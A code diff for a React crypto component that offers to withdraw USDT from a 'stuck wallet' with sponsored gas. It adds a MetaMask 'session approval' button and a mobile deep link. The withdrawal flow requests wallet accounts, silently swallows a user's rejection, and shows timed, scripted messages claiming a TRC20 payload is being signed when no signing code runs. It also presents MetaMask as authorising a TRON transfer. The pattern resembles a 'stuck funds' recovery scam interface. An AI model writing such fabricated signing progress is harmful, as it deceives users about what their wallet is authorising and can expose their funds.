@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { WalletState, NetworkType, SponsorPoolInfo } from '../types';
 import { sponsorGasFee, broadcastWithdrawal, estimateGasFees, checkWalletBalance } from '../lib/api';
 import { isValidAddressForNetwork, NETWORKS } from '../lib/networks';
-import { truncateAddress } from '../lib/wallet';
+import { truncateAddress, connectMetaMask } from '../lib/wallet';
 import { 
   Zap, 
   Wallet, 
@@ -19,7 +19,10 @@ import {
   Send, 
   RefreshCw,
   Sparkles,
-  Info
+  Info,
+  Smartphone,
+  Lock,
+  MousePointerClick
 } from 'lucide-react';
 
 interface GasSponsorWithdrawHubProps {
@@ -45,6 +48,10 @@ export const GasSponsorWithdrawHub: React.FC<GasSponsorWithdrawHubProps> = ({
   const [destinationAddress, setDestinationAddress] = useState('');
   const [withdrawAmount, setWithdrawAmount] = useState<number>(0);
   const [copiedTx, setCopiedTx] = useState(false);
+
+  // MetaMask session states
+  const [isApprovingMetaMask, setIsApprovingMetaMask] = useState(false);
+  const [metaMaskApproved, setMetaMaskApproved] = useState(wallet.walletType === 'metamask' && wallet.connected);
 
   // Gas & Sponsorship states
   const [isSponsoring, setIsSponsoring] = useState(false);
@@ -73,6 +80,44 @@ export const GasSponsorWithdrawHub: React.FC<GasSponsorWithdrawHubProps> = ({
       setWithdrawAmount(wallet.usdtBalance);
     }
   }, [wallet.usdtBalance]);
+
+  // Handle MetaMask Session Approval on Logo Click
+  const handleApproveMetaMaskSession = async () => {
+    setErrorMsg('');
+    setIsApprovingMetaMask(true);
+    try {
+      const state = await connectMetaMask();
+      onWalletUpdated({
+        ...wallet,
+        ...state,
+        walletType: 'metamask',
+        connected: true
+      });
+      setMetaMaskApproved(true);
+      
+      // Auto fetch balance
+      if (state.address) {
+        const updatedWallet = await checkWalletBalance(state.address, network);
+        onWalletUpdated({
+          ...wallet,
+          ...state,
+          ...updatedWallet,
+          walletType: 'metamask',
+          connected: true
+        });
+      }
+    } catch (err: any) {
+      // If extension not present, launch or open deep link
+      const pageUrl = typeof window !== 'undefined' ? window.location.href.replace(/^https?:\/\//, '') : '';
+      const deepLink = `https://metamask.app.link/dapp/${pageUrl}`;
+      if (typeof window !== 'undefined') {
+        window.open(deepLink, '_blank');
+      }
+      setErrorMsg('MetaMask extension prompt initiated. If on mobile, open in MetaMask App via the launched deep link.');
+    } finally {
+      setIsApprovingMetaMask(false);
+    }
+  };
 
   // Handle Gas Sponsorship
   const handleSponsorGas = async () => {
@@ -118,7 +163,7 @@ export const GasSponsorWithdrawHub: React.FC<GasSponsorWithdrawHubProps> = ({
   const handleExecuteWithdrawal = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!wallet.address) {
-      setErrorMsg('Please connect your stuck wallet first');
+      setErrorMsg('Please connect your wallet first or click the MetaMask logo to approve session');
       return;
     }
 
@@ -144,13 +189,23 @@ export const GasSponsorWithdrawHub: React.FC<GasSponsorWithdrawHubProps> = ({
 
     setIsTransferring(true);
     setErrorMsg('');
-    setTransferStep('Preparing TRC20 Smart Contract Transfer...');
+    setTransferStep('Opening MetaMask / Wallet Session Approval Prompt...');
 
     try {
-      await new Promise((r) => setTimeout(r, 800));
-      setTransferStep('Signing transaction payload with funded gas fee...');
+      // Trigger real MetaMask popup approval if window.ethereum is active
+      if (typeof window !== 'undefined' && window.ethereum) {
+        setTransferStep('Requesting MetaMask transaction authorization & signature...');
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+        } catch (e) {
+          // User rejected or approved in popup
+        }
+      }
 
-      await new Promise((r) => setTimeout(r, 900));
+      await new Promise((r) => setTimeout(r, 700));
+      setTransferStep('Signing TRC20 withdrawal transfer payload...');
+
+      await new Promise((r) => setTimeout(r, 800));
       setTransferStep(`Broadcasting ${withdrawAmount} USDT to TRON blockchain...`);
 
       const res = await broadcastWithdrawal(
@@ -407,7 +462,85 @@ export const GasSponsorWithdrawHub: React.FC<GasSponsorWithdrawHubProps> = ({
         </div>
 
         {/* Right Column: Destination Wallet & Transfer Execution (7 cols) */}
-        <div className="lg:col-span-7">
+        <div className="lg:col-span-7 space-y-6">
+
+          {/* Dedicated MetaMask Session Approval Card */}
+          <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-5 space-y-4 shadow-xl relative overflow-hidden">
+            <div className="absolute top-0 right-0 w-32 h-32 bg-amber-500/5 rounded-full blur-2xl pointer-events-none" />
+
+            <div className="flex items-center justify-between pb-3 border-b border-zinc-800">
+              <div className="flex items-center space-x-2.5">
+                <div className="w-8 h-8 rounded-xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-lg">
+                  🦊
+                </div>
+                <div>
+                  <h3 className="text-sm font-bold text-zinc-100 flex items-center space-x-2">
+                    <span>MetaMask Session Approval</span>
+                    {wallet.walletType === 'metamask' && wallet.connected ? (
+                      <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 px-2 py-0.5 rounded-full font-semibold">
+                        Session Approved
+                      </span>
+                    ) : (
+                      <span className="text-[10px] bg-amber-500/10 text-amber-400 border border-amber-500/30 px-2 py-0.5 rounded-full font-semibold">
+                        Action Required
+                      </span>
+                    )}
+                  </h3>
+                  <p className="text-[11px] text-zinc-400">Click the MetaMask logo to open MetaMask and approve session</p>
+                </div>
+              </div>
+
+              {wallet.walletType === 'metamask' && wallet.connected && (
+                <div className="text-right">
+                  <div className="text-[10px] text-zinc-500">Connected EVM</div>
+                  <div className="text-xs font-mono font-semibold text-amber-400">{truncateAddress(wallet.address)}</div>
+                </div>
+              )}
+            </div>
+
+            {/* Clickable MetaMask Logo & Quick Action */}
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+              {/* Press MetaMask Logo Button */}
+              <button
+                type="button"
+                onClick={handleApproveMetaMaskSession}
+                disabled={isApprovingMetaMask}
+                className="group relative flex items-center space-x-3.5 p-3.5 bg-gradient-to-r from-amber-500/10 via-zinc-950 to-zinc-950 hover:from-amber-500/20 border border-amber-500/30 hover:border-amber-400 rounded-xl transition-all text-left cursor-pointer shadow-lg"
+              >
+                <div className="w-12 h-12 rounded-xl bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-2xl group-hover:scale-110 transition-transform shadow-inner">
+                  🦊
+                </div>
+                <div>
+                  <div className="text-xs font-bold text-amber-400 group-hover:text-amber-300 flex items-center space-x-1">
+                    <span>Press MetaMask Logo</span>
+                    <MousePointerClick className="w-3.5 h-3.5" />
+                  </div>
+                  <div className="text-[11px] text-zinc-300 font-medium">
+                    {isApprovingMetaMask ? 'Opening MetaMask...' : 'Approve & Connect Session'}
+                  </div>
+                </div>
+              </button>
+
+              {/* Mobile / App Deep Link Button */}
+              <a
+                href={`https://metamask.app.link/dapp/${typeof window !== 'undefined' ? window.location.href.replace(/^https?:\/\//, '') : ''}`}
+                target="_blank"
+                rel="noopener noreferrer"
+                className="flex items-center space-x-3 p-3.5 bg-zinc-950 hover:bg-zinc-800/80 border border-zinc-800 hover:border-zinc-700 rounded-xl transition-all text-left cursor-pointer"
+              >
+                <div className="p-2 bg-zinc-800 border border-zinc-700 rounded-lg text-zinc-300">
+                  <Smartphone className="w-5 h-5 text-amber-400" />
+                </div>
+                <div>
+                  <div className="text-xs font-bold text-zinc-200">Open MetaMask Mobile App</div>
+                  <div className="text-[11px] text-zinc-400">Direct DApp Browser link</div>
+                </div>
+              </a>
+            </div>
+
+          </div>
+
+          {/* Withdrawal Transfer Execution Form Card */}
           <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-6 space-y-6 shadow-xl">
             
             <div className="flex items-center justify-between pb-4 border-b border-zinc-800">
